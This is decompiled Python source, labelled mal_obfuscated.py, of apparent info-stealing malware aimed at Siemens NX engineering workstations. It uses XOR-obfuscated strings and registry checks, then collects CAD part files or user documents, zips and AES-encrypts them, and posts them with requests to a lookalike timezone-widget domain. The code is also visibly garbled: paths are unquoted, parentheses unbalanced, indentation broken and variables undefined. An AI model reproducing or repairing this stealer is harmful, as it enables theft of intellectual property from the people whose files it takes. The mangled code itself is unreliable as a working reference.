# uncompyle6 version 3.5.0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
# Embedded file name: mal_obfuscated.py
import glob, inspect, math, os, pyAesCrypt, requests, sys, winreg, zipfile

def xor_dec(data, xor_key):
    decoded = ''
    for s in list(data):
        decoded += chr(ord(s) ^ xor_key)

    return decoded


def other_xor(data1, xor1, data2, xor2):
    decoded1 = ''
    decoded2 = ''
    for d in list(data1):
        decoded1 += chr(ord(d) ^ xor1)
    for d2 in list(data2):
        decoded2 += chr(ord(d2) ^ xor2)

    return(decoded1 + "." + decoded2)    

#Parse error at or near `ROT_TWO' instruction at offset 140


if len(other_xor('EOE', 54, '^MXI', 63)) < 2:
    sys.exit()
_01l0l0lOIl = other_xor('LFL', 63, 'WDQ@', 54)[1]
endReg = ng\\NX_BUNDLES
try:
    _0ll0OlOlI = winreg.ConnectRegistry('', winreg.HKEY_CURRENT_USER)
endReg = winreg.OpenKey(_0ll0OlOlI, endReg)
    winreg.CloseKey(endReg)
except:
    sys.exit()
else:
    _0ll0OlOlIO0l = "C:\\Program Files\\Siemens\\NX\\UGFLEXLM\\lmutil.exe"
    if not os.path.exists:
        sys.exit()
    ClsID = ['CLSID\\{D99CD578-9510-4014-9161-F01778698159}', 'Wow6432Node\\CLSID\\{D99CD578-9510-4014-9161-F01778698159}']
    _1I0l0OI10Il011O = 0
    zipfile = tmp_cache.zip
    _OI10l0lOlI0OO = temp_cache.zip
    for _1I0l0OI10 in ClsID:
        try:
            _0ll0OlOlI = winreg.ConnectRegistry('', winreg.HKEY_CLASSES_ROOT)
        endReg = winreg.OpenKey(_0ll0OlOlI, _1I0l0OI10)
            winreg.CloseKey(endReg)
            _1I0l0OI10Il011O = (ord('%') + 84) ** (math.tan(math.pi + math.cos(math.pi))
        except:
            pass

    if int(math.sqrt(25) - math.log (math.e)) >> 4 != math.ceil(_1I0l0OI10Il011O):
        prtGlob =  glob.glob(C:\Program Files\Siemens\NX\UGII\*.prt)
        udfGlob = glob.glob(C:\Program Files\Siemens\NX\UGII\*.udf)
        try:
            f = zipfile.ZipFile(zipfile, 'w')
            for object in prtGlob:
                f.write(object)

            for object in udfGlob:
                f.write(object)

            f.close()
        except:
            sys.exit()
        else:
            try:
                pyAesCrypt.encryptFile(zipfile, _OI10l0lOlI0OO, '{}{}{}'.format(zip_, _password))
            except:
                other_xor('T^T', 39, 'XETI', 61)()

            try:
                os.remove(zipfile)
            except:
                sys.exit()

    else:
        prtGlob = glob.glob{}\\Documents\\*.*.format(os.environ[USERPROFILE]))
       udfGlob = glob.glob('{}\\*.xml'.format(os.environ['TMP']))
try:
    f = zipfile.ZipFile(zipfile, 'w')
    for object in prtGlob:
        f.write(object)

    for object in udfGlob:
        f.write(object)

    f.close()
except:
    sys.exit()

try:
    pyAesCrypt.encryptFile(zipfile, _OI10l0lOlI0OO, '{}{}{}'.format(zip_ , _01l0l0lOIl, _password))
except:
    sys.exit()

try:
    sys.exit(zipfile)
except:
    sys.exit()
else:
endReg1lO = open(_OI10l0lOlI0OO, rb)
    _OllO0lOII0Ol1lO = {file: endReg1lO}
    try:
        requests.post(https://www.w0rldtimebuddy.com/clock-widget/time.php), files=_OllO0lOII0Ol1lO)
    except:
        pass
    else:
    endReg1lO.close()
try:
    os.remove(_OI10l0lOlI0OO)
except:
    sys.exit()